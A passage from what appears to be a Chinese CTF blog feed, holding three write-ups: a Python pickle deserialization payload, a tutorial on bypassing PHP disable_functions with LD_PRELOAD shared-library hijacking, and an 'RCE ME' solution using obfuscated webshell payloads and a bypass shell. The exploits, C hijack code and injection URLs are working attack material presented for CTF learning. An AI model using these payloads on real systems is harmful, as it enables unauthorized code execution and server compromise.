<strong>setstate</strong>(self)</li></ul><p>  当一个对象被反pickle时，如果定义了 <strong>setstate</strong> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <strong>dict</strong> 属性。这个魔法方法和__getstate__ 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> 的存在是为了兼容性。如果它被定义，在pickle时__reduce_ex__ 会代替 <strong>reduce</strong> 被调用。 <strong>reduce</strong> 也可以被定义，用于不支持 <strong>reduce_ex</strong> 的旧版pickle的API调用。</p><p>这里构造payload,传给become：</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一打开页面，很魔性。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="jwt" scheme="https://sakurahack-y.github.io/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</title>
    <link href="https://sakurahack-y.github.io/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/"/>
    <id>https://sakurahack-y.github.io/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-19T15:10:48.000Z</published>
    <updated>2021-10-19T16:10:08.221Z</updated>
    
    <content type="html"><![CDATA[<p>使用场景：</p><p>当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。</p><p>无命令执行功能的 webshell 是无意义的，得突破！</p><p>首先来介绍下我们需要使用的两个函数：</p><p>LD_PRELOAD:</p><p>google给出如下定义：</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p><p>PUTENV函数：可以设置环境变量</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so  中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p><h2 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h2><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下</p><p>这里简单写个demo</p><pre><code class="php">&lt;?phpmail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</code></pre><p>那么我们只要看一下sendmail使用了哪些函数</p><p><a href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p><p>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so</code></pre><p>然后我们运行脚本</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p><a href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p><p>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky</p><pre><code>root@sky:~# ls /tmp | grep skysky</code></pre><p>我们查看一下</p><pre><code>root@sky:~# cat /tmp/skybinbootdevetchomeliblib32....</code></pre><p>发现成功执行命令</p><p>但是这是基于存在sendmail()这个常用函数的基础上，如果目标的sendmail()函数也被禁用了那该怎么办呢？</p><p>下面来介绍改进版的：</p><h2 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h2><p>已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p><pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit.</code></pre><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><p>常考察的还有php-imagick</p><p>我们发现如下对应关系</p><p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p><p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p><p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p><p>我们测试一下.wmv</p><p>写出脚本</p><pre><code class="php">&lt;?php$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>我们测试一下</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</code></pre><p>可以发现的确成功启动了子进程，调用了ffmpeg</p><p>但是如果sky.wmv文件不存在时</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</code></pre><p>则不会调用ffmpeg</p><p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p><p>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><p> payload &amp; attack</p><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了</p><p>我们还是用之前的sky.c</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC sky.c -o skygcc --share sky -o sky.so</code></pre><p>测试一下</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./sky.so&quot;);$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>运行发现</p><pre><code>root@sky:~# php sky.phpbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.oldPHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3Stack trace:#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)#1 &#123;main&#125;  thrown in /root/sky.php on line 3</code></pre><p>我们成功的进行了列目录</p><p>这里串一下思路：</p><p>首先执行sky.php ,设置了恶意环境变量。下一步我们需要调用子进程来加载环境变量，所以这里就会使用new imagick(‘sky.wmv’),调用了ffmpeg这个子进程，这个进程在加载之前就调用了环境变量，加载了共享对象sky.so.加载完后它会自动执行__attribute__ ((<strong>constructor</strong>)),就会调用system命令。</p><h2 id="getflag流程"><a href="#getflag流程" class="headerlink" title="getflag流程:"></a>getflag流程:</h2><p>那么现在思路很清晰：</p><p>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中</p><p>2.利用backdoor运行sky.php</p><p>3.在tmp目录读取重定向的结果</p><p>参考：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> （膜拜大佬，基本都是搬过来的，自己的代码功底太弱，大佬讲的又非常好就搬运了一下）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用场景：&lt;/p&gt;
&lt;p&gt;当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。&lt;/p&gt;
&lt;p&gt;无命令执行功能的 webshell 是无意义的，得突破！&lt;/p&gt;
&lt;p&gt;首先来介绍下我们需要使用的两个函数：&lt;/p&gt;
&lt;p&gt;L</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
    
    
    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2019 RCE ME __0X01-0X0F</title>
    <link href="https://sakurahack-y.github.io/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/"/>
    <id>https://sakurahack-y.github.io/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/</id>
    <published>2021-10-18T06:24:58.000Z</published>
    <updated>2021-10-19T15:09:41.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打开题目，源码如图，看起来很简单："><a href="#打开题目，源码如图，看起来很简单：" class="headerlink" title="打开题目，源码如图，看起来很简单："></a>打开题目，源码如图，看起来很简单：</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><p>重点关注 preg_match() 函数，它将所有的字母和数字都进行了过滤，所以我们无法通过$code直接传入命令，因此需要绕过。</p><p>最常用的就是取反绕过。</p><p>先取phpinfo来测试一下</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143439534.png" alt="image-20211018143439534"></p><p>为什么要加urlencode()？这里是因为字符串取反后会变成无法识别的字符，而这也是能绕过preg_match()函数的原因。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143653122.png" alt="image-20211018143653122"></p><p>成功得到信息。</p><p>下一步考虑通过取反来构建webshell。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143038799.png" alt="image-20211018143038799"></p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143850709.png" alt="image-20211018143850709"></p><p>测试一下webshell是否有效：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144115367.png" alt="image-20211018144115367"></p><p>成功，使用蚁剑来连接一下。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144244347.png" alt="image-20211018144244347"></p><p>连接成功。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144318564.png" alt="image-20211018144318564"></p><p>在根目录发现了readflag和flag，根据经验是要我们执行readflag来获取到flag。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144428698.png" alt="image-20211018144428698"></p><p>这时候就懵逼了，命令无法执行是一个废shell。</p><p>让我们再会到phpinfo()仔细观察，发现如下：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143523288.png" alt="image-20211018143523288"></p><p>敏感函数基本全被禁用了。</p><p>那我们就要绕过disable_functions来执行readflag文件了。</p><h2 id="蚁剑中有一个插件可以绕过disable-functions-非预期解法"><a href="#蚁剑中有一个插件可以绕过disable-functions-非预期解法" class="headerlink" title="蚁剑中有一个插件可以绕过disable_functions(非预期解法)"></a>蚁剑中有一个插件可以绕过disable_functions(非预期解法)</h2><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144830831.png" alt="image-20211018144830831"></p><p>启用插件，选择</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145031532.png" alt="image-20211018145031532"></p><p>发现成功绕过，并执行readflag文件获取到了flag</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145133785.png" alt="image-20211018145133785"></p><h2 id="通过LD-PRELOAD与putenv来执行命令"><a href="#通过LD-PRELOAD与putenv来执行命令" class="headerlink" title="通过LD_PRELOAD与putenv来执行命令"></a>通过LD_PRELOAD与putenv来执行命令</h2><p>基本思路：</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。在另一篇博客中我会详细的介绍下这个，这里不做深入讨论。</p><p>发现/var/tmp目录下有上传权限，上传exp，<img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019221359870.png" alt="image-20211019221359870"></p><p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p><pre><code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></pre><p>由于在本题中对code有字符数量的限制，所以需要修改我们的payload为异或：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019230656350.png" alt="image-20211019230656350"></p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])</code></pre><pre><code>http://543c3847-4a06-4587-b8a5-7be27d7b7d7d.node4.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019225739892.png" alt="image-20211019225739892"></p><p>看网上的大多数是第一种解法，感觉大家都太浮躁，我也不例外。不能为了刷题而刷题。掌握知识点和方法，才能在遇到相似题目时能够及时写出来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打开题目，源码如图，看起来很简单：&quot;&gt;&lt;a href=&quot;#打开题目，源码如图，看起来很简单：&quot; class=&quot;headerlink&quot; title=&quot;打开题目，源码如图，看起来很简单：&quot;&gt;&lt;/a&gt;打开题目，源码如图，看起来很简单：&lt;/h1&gt;&lt;pre&gt;&lt;code cl</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="rec" scheme="https://sakurahack-y.github.io/tags/rec/"/>
    
  </entry>
  
</feed>
